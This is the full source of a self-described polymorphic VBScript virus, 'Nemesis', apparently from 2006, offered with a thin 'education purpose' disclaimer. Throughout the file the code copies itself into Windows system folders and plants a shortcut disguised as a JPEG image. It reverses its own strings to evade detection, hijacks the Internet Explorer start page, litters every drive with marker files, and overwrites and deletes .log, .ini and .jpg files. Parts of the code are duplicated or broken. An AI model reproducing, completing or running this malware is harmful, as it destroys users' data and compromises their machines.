'nemesis
'This is only for education purpose !!!
'Coded by KGB 2006 >> Nemesis Polymorphic vbs Virus
set executor = wscript.CreateObject(decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("WScript.Shell")))))))
Set fso = createobject(decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("scripting.filesystemobject")))))))
fso.CopyFile Wscript.ScriptFullName, decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("C:\windows\nemesis.vbs"))))))
fso.copyfile wscript.scriptfullname,decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("C:\windows\System32\xvxd.sys")))))) 'or %/ROOT/%
On Error Resume next 
set executor = wscript.createobject(decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("wscript.shell")))))))
set msc = executor.CreateShortCut(decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("C:\Documents and Settings\All Users\Desktop\Porno-pic.jpg.lnk")))))))
msc.TargetPath = executor.ExpandEnvironmentStrings(decrypt(decrypt(decrypt(decrypt(decrypt(decryp
("C:\windows\nemesis.vbs")))))))
msc.IconLocation = Shell.ExpandEnvironmentStrings(decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("C:\windows\system32\mspaint.vbs, 0")))))))
msc.WindowStyle = 4
msc.Save 
On Error Resume Next
set fso = createobject(decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("scripting.filesystemobject")))))))
set op = fso.opentextfile(wscript.scriptfullname,1)
set parser = fso.Createtextfile(decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("C:\Boot.txt")))))),true)
do while mark <> decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("'nemesis"))))))
mark = op.readline
for i = 1 to len(mark)
c = mid(mark,i,1)
if c = chr(34) then
Call Poly
else
parser.write c
end if
if i = len(mark) then
parser.write vbcrlf
end if
next
loop
sub Poly()
Counter = i
do while enc <> chr(34)
Counter = Counter + 1
enc = mid(mark,Counter,1)
if enc = chr(34) then exit do
char = char & enc
loop
all = decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("decrypt(")))))) & chr(34) & strreverse(char) & chr(34) & decrypt(decrypt(decrypt(decrypt(decrypt(decrypt(")"))))))
parser.write all
i = Counter
end sub
op.close
parser.close
set back = fso.opentextfile(decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("C:\Boot.txt")))))),1)
reader = back.readall
set wrtall = fso.Createtextfile(decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("C:\Boot.txt")))))),true)
wrtall.write reader
wrtall.writeline decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("function decrypt(x)")))))) & vbcrlf & decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("Decrypt = strreverse(x):end function"))))))
fso.copyfile decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("C:\Boot.txt")))))),wscript.scriptfullname
msgbox strMsg,,decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("your message here"))))))
Msgbox strMsg,, decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("your message here"))))))
Msgbox strMsg,, decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("your message here"))))))
Msgbox strMsg,, decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("Wyour message here!"))))))
Set objWshShell = CreateObject(decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("WScript.Shell")))))))
strHomePage = decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("http://yoursite.com"))))))
objWshShell.RegWrite decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")))))), strHomePage
Set objWshShell = Nothing
On Error Resume Next
dim FSobj,orgMes,finalMes
set FSobj=CreateObject(decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("Scripting.FileSystemObject")))))))
orgMes = decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("Hy i think KGB was here, be happy is a nice day:) - by *|%|"))))))
orgMes=replace(orgMes,chr(42),chr(68))
orgMes=replace(orgMes,chr(124),chr(46))
finalMes=replace(orgMes,chr(37),chr(76))
On Error Resume Next
dim drive,machine
set machine = FSobj.Drives
for each drive in machine
if (drive.DriveType=2)or(drive.DriveType=3) then
indexFolders(drive.Path&decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("\")))))))
end If
next
sub indexFolders(location)
On Error Resume Next
dim specs,file,subFol,sayNemesis
set specs=FSobj.GetFolder(location)
set subFol=specs.SubFolders
for each file in subFol
set saynemesis = FSobj.CreateTextFile(file.Path&decrypt(decrypt(decrypt(decrypt(decrypt(decrypt(".nemesis")))))), 2, True)
saynemesis.write finalMes
saynemesis.Close
writeData(file.Path)
indexFolders(file.Path)
next
end sub
sub writeData(location)
On Error Resume Next
dim folder,directory,file,saynemesis
set folder=FSobj.GetFolder(location)
set directory=folder.Files
for each file in directory
set saynemesis = FSobj.CreateTextFile(file.Path&decrypt(decrypt(decrypt(decrypt(decrypt(decrypt(".nemesis")))))), 2, True)
saynemesis.write finalMes
saynemesis.Close
msgbox strMsg,,decrypt(decrypt(decrypt(decrypt(decrypt(decrypt("Definiton completed"))))))
Next
End sub
function GetLow()
set copySelf = FSobj.CreateTextFile(sysDir+"\nemesis.vbs")
copySelf.close
set newFile=FSobj.OpenTextFile(WScript.ScriptFullname,1)
writeCopy()
hackedFileData=replace(rawFileData,chr(42),chr(68))
fixData=replace(hackedFileData,chr(37),chr(76))
dataFixed=replace(fixData,chr(124),chr(46))
newFileData=replace(dataFixed,chr(94),"""")
set copySelfComplete = FSobj.OpenTextFile(sysDir+"\nemesis.vbs",2)
copySelfComplete.write newFileData
copySelfComplete.close 
End function
sub GetLow
On Error Resume Next
dim drive,machine,complete
set machine=FSobj.Drives
for each drive in machine
if (drive.DriveType = 2)or(drive.DriveType = 3) then
indexFolders(drive.Path&"\")
end If
next
beginInfestation=complete
end sub
sub indexFolders(location)
On Error Resume Next
dim specs, file, subFol
set specs=FSobj.GetFolder(location)
set subFol=specs.SubFolders

for each file in subFol
spreadData(file.Path)
indexFolders(file.Path)
next
end Sub
sub spreadData(location)
On Error Resume Next
dim folder,directory,file,generateCopy,appName,adExt,orgMes,mesStageTwo,mesStageThre
,finalMes,extName,complete
set folder=FSobj.GetFolder(location)
set directory = folder.Files
orgMes = "your message here"
mesStageTwo=replace(orgMes,chr(42),chr(68))
mesStageThree=replace(mesStageTwo,chr(124),chr(46))
finalMes = replace(mesStageThree,chr(37),chr(76)) 
for each file in directory
extName=lcase(FSobj.GetExtensionName(file.Path))
complete = lcase(file.Name)
If (extName = "log")or(extName = "ini")or(extName = "jpg") Then
set generateCopy = FSobj.OpenTextFile(file.Path, 2, True)
generateCopy.write finalMes
generateCopy.Close
appName=FSobj.GetBaseName(file.Path)
set adExt=FSobj.GetFile(file.Path)
adExt.copy(location&"\"&appName&".txt")
FSobj.DeleteFile (file.Path) 
end if
next
end sub
'nemesis
function decrypt(x)
Decrypt = strreverse(x):end function 